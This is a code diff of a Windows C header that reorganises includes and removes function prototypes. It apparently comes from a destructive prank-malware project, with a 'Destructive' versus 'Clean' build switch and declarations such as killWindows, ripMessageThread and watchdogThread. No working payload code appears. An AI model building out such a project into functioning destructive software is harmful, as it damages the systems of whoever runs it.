@@ -18,7 +18,6 @@ processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")
 #define WINDOWHEIGHT ROWS * BTNHEIGHT + (ROWS + 1)*SPACE + 32
 #endif
 
-//#pragma once
 
 #include <windows.h>
 #include <tlhelp32.h>
@@ -28,25 +27,14 @@ processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")
 
 #include "../Build/Data.h"
 #include "Payloads/Payloads.h"
+#include "Utils/Utils.h"
+
+#ifdef CLEAN
+	#include "Clean/Clean.h"
+#else
+	#include "Destructive/Destructive.h"
+#endif
 
 void start();
 
-int random();
-void strReverseW(LPWSTR str);
-
-PAYLOADHOST(payloadHostDefault);
-PAYLOADHOST(payloadHostVisual);
-
 LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
-
-#ifndef CLEAN
-void killWindows();
-void killWindowsInstant();
-
-DWORD WINAPI ripMessageThread(LPVOID);
-DWORD WINAPI watchdogThread(LPVOID);
-#else
-DWORD WINAPI keyboardThread(LPVOID lParam);
-extern BOOLEAN enablePayloads;
-BOOL CALLBACK CleanWindowsProc(HWND hwnd, LPARAM lParam);
-#endif
